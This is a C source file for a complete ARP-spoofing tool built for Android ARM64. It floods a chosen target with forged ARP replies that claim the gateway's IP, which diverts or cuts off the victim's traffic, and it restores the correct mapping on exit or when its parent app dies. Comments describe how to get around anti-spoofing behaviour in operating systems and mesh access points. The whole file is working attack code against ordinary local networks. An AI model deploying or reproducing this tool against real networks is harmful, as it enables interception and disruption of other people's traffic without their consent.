// arpspoof - continuously ARP-spoof a target claiming the gateway's IP.
// Usage:
//   arpspoof [--restore-only] <iface> <target_ip> <target_mac> <gw_ip> <gw_mac> [app_pid]
// --restore-only: send a burst of corrective replies and exit (used by the
//   app's watchdog to rescue a victim whose spoofer died unexpectedly).
// app_pid: when given, exit with a restore burst if that pid disappears,
//   i.e. the owning app died and nobody is left to SIGTERM us.
// On SIGTERM/SIGINT: restore the correct gateway mapping, then exit.
// Linux-only (AF_PACKET). Statically compiled for Android ARM64.
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

/* 14-byte Ethernet header + 28-byte ARP payload padded to the 60-byte
 * Ethernet minimum frame size (ETH_ZLEN); some Wi-Fi firmware drops runt
 * frames smaller than this. */
#define FRAME_LEN 60

typedef struct { unsigned char addr[6]; } mac_t;

static int  g_sock = -1;
static int  g_ifindex;
static char g_ifname[IFNAMSIZ];
static mac_t g_own_mac;
static uint8_t g_spoof_frame[FRAME_LEN];
static uint8_t g_restore_frame[FRAME_LEN];
static volatile sig_atomic_t g_restore_count = 0;
static pid_t g_app_pid = 0;

static uint32_t ip_from_str(const char *s) { return ntohl(inet_addr(s)); }

static int mac_from_str(const char *s, mac_t *out) {
    unsigned int b[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) out->addr[i] = (unsigned char)b[i];
    return 0;
}

static void build_arp_reply(uint8_t *frame, uint32_t sender_ip, const mac_t *sender_mac,
                            uint32_t target_ip, const mac_t *target_mac) {
    struct ethhdr *eth = (struct ethhdr *)frame;
    struct arphdr *arp = (struct arphdr *)(frame + sizeof(struct ethhdr));
    unsigned char *payload = frame + sizeof(struct ethhdr) + sizeof(struct arphdr);

    memcpy(eth->h_dest, target_mac->addr, 6);
    memcpy(eth->h_source, sender_mac->addr, 6);
    eth->h_proto = htons(ETH_P_ARP);

    arp->ar_hrd = htons(ARPHRD_ETHER);
    arp->ar_pro = htons(ETH_P_IP);
    arp->ar_hln = 6;
    arp->ar_pln = 4;
    arp->ar_op  = htons(ARPOP_REPLY);

    uint32_t s_ip = htonl(sender_ip);
    uint32_t t_ip = htonl(target_ip);
    memcpy(payload, sender_mac, 6);
    memcpy(payload + 6, &s_ip, 4);
    memcpy(payload + 10, target_mac, 6);
    memcpy(payload + 16, &t_ip, 4);
}

static int send_frame(const uint8_t *frame, size_t len) {
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ARP);
    sll.sll_ifindex = g_ifindex;
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, frame, 6);
    return sendto(g_sock, frame, len, 0, (struct sockaddr *)&sll, sizeof(sll));
}

/* Send the corrective burst that repairs the victim's gateway mapping.
 *
 * The pause matters: stacks like macOS drop gratuitous replies that flip
 * an entry which was just updated by a conflicting one (anti-spoofing).
 * Restoring immediately after the last spoofed reply therefore silently
 * fails; waiting out that window and spreading the burst makes the fix
 * stick. */
static void send_restore_burst(void) {
    sleep(1);
    for (int i = 0; i < 8; i++) {
        if (send_frame(g_restore_frame, sizeof(g_restore_frame)) < 0)
            perror("restore sendto");
        usleep(400000);
    }
}

static void sighandler(int signo) {
    (void)signo;
    g_restore_count = 5;
}

int main(int argc, char **argv) {
    int restore_only = 0;
    int argi = 1;
    if (argi < argc && strcmp(argv[argi], "--restore-only") == 0) {
        restore_only = 1;
        argi++;
    }
    if (argc - argi < 5) {
        fprintf(stderr,
                "usage: %s [--restore-only] <interface> <target_ip> <target_mac> "
                "<gateway_ip> <gateway_mac> [app_pid]\n",
                argv[0]);
        return 1;
    }
    strncpy(g_ifname, argv[argi], sizeof(g_ifname) - 1);
    uint32_t target_ip = ip_from_str(argv[argi + 1]);
    mac_t target_mac;
    if (mac_from_str(argv[argi + 2], &target_mac) != 0) {
        fprintf(stderr, "invalid target mac\n");
        return 1;
    }
    uint32_t gateway_ip = ip_from_str(argv[argi + 3]);
    mac_t gateway_mac;
    if (mac_from_str(argv[argi + 4], &gateway_mac) != 0) {
        fprintf(stderr, "invalid gateway mac\n");
        return 1;
    }
    if (argc - argi >= 6) {
        char *end = NULL;
        long v = strtol(argv[argi + 5], &end, 10);
        if (argv[argi + 5][0] != '\0' && end != NULL && *end == '\0' && v > 0)
            g_app_pid = (pid_t)v;
    }

    g_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (g_sock < 0) { perror("socket"); return 1; }
    g_ifindex = if_nametoindex(g_ifname);
    if (!g_ifindex) { perror("if_nametoindex"); return 1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, g_ifname, IFNAMSIZ - 1);
    if (ioctl(g_sock, SIOCGIFHWADDR, &ifr) < 0) { perror("ioctl hwaddr"); return 1; }
    memcpy(g_own_mac.addr, ifr.ifr_hwaddr.sa_data, 6);

    build_arp_reply(g_spoof_frame, gateway_ip, &g_own_mac, target_ip, &target_mac);
    build_arp_reply(g_restore_frame, gateway_ip, &gateway_mac, target_ip, &target_mac);
    /* Corrective replies must keep OUR radio identity on the wire: APs
     * (mesh systems especially) drop client frames whose Ethernet source
     * matches another port, e.g. the gateway itself, so spoofing the L2
     * source would silence exactly the packets that undo the attack. The
     * victim repairs its cache from the ARP payload, not the eth header,
     * so announcing gw_ip -> gw_mac there is sufficient. */
    memcpy(g_restore_frame + offsetof(struct ethhdr, h_source), g_own_mac.addr, 6);

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sighandler;
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGINT, &sa, NULL);

    if (restore_only) {
        send_restore_burst();
        return 0;
    }

    fprintf(stderr,
            "spoofing %s (%02x:%02x:%02x:%02x:%02x:%02x) => gw %s using "
            "%02x:%02x:%02x:%02x:%02x:%02x\n",
            argv[argi + 1], target_mac.addr[0], target_mac.addr[1], target_mac.addr[2],
            target_mac.addr[3], target_mac.addr[4], target_mac.addr[5],
            argv[argi + 3], g_own_mac.addr[0], g_own_mac.addr[1], g_own_mac.addr[2],
            g_own_mac.addr[3], g_own_mac.addr[4], g_own_mac.addr[5]);

    for (;;) {
        if (g_restore_count > 0) {
            // Restore correct gateway->target mapping then exit.
            send_restore_burst();
            return 0;
        }
        if (g_app_pid > 0 && kill(g_app_pid, 0) == -1 && errno == ESRCH) {
            // Owning app died; nobody is left to deliver a SIGTERM.
            fprintf(stderr, "app pid %d gone, restoring\n", (int)g_app_pid);
            g_restore_count = 5;
            continue;
        }
        if (send_frame(g_spoof_frame, sizeof(g_spoof_frame)) < 0)
            perror("sendto");
        sleep(1);
    }
    return 0;
}